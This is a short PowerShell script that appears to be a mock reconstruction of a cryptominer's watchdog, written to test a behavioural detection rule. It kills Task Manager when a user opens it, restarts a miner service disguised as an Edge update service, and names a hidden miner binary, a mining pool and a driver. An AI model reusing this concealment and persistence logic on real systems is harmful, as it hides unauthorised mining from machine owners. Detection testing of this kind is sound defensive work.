# Mock AhsayCBS exploitation — Taskgmr.ps1 watchdog (reconstructed from
# Huntress analysis). Tests AhsayCBS_XMRig_Behavioral paths 1, 5, and 6.
# NOT functional malware — indicators are inert and for detection testing only.

# Service name used by modified NSSM (msedge.exe) to persist the miner
$serviceName = "MicrosoftEdgeUpdateSvc"

# Kill Task Manager if user tries to inspect CPU usage
$procs = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue
if ($procs) {
    Stop-Process -Name "taskmgr" -Force
}

# Restart the mining service if it was stopped
Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
Start-Service -Name $serviceName

# XMRig miner binary launched by the service
$minerPath = "C:\ProgramData\Microsoft\edge.exe"
$config = "C:\ProgramData\Microsoft\config.json"

# Pool configuration
$pool = "xmr.kryptex.network:8029"
$user = "krxYMRN97D/creativejs"

# WinRing0x64.sys driver loaded for MSR register access
$driver = "WinRing0x64.sys"

# This script is Taskgmr.ps1 — runs on a scheduled task loop
